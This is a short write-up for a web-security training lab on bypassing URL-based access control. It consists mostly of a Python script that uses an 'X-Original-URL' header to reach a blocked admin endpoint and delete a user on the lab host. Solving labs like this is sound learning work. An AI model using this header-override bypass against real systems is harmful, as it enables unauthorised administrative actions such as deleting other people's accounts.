# URL-based access control can be circumvented

> This website has an unauthenticated admin panel at `/admin`, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the `X-Original-URL` header.
> To solve the lab, access the admin panel and delete the user `carlos`.

```python
import requests
import sys

# Configuration
BASE_URL = "https://0a0800e70492804b804b5d1b00f00051.web-security-academy.net/"

def delete_user(url):
    # The vulnerability allows us to hit the root '/' but tell the backend 
    # to execute the '/admin/delete' logic using the X-Original-URL header.
    
    # We pass the query parameters in the actual URL while the path is in the header
    dlt_endpoint = url + "?username=carlos"
    
    header = {
        "X-Original-URL": "/admin/delete"
    }
    
    print(f"[*] Sending bypass request to: {url}")
    print(f"[*] Using Header -> X-Original-URL: /admin/delete")
    
    # Trigger the deletion
    requests.get(dlt_endpoint, headers=header)
    
    # Verify success by checking the home page for the solved banner
    response = requests.get(url)
    if "Congratulations" in response.text:
        print("[+] SUCCESSFULL: User 'carlos' deleted and lab solved.")
    else:
        print("[-] Failed to solve the lab. Check the header or endpoint.")

if __name__ == "__main__":
    delete_user(BASE_URL)
```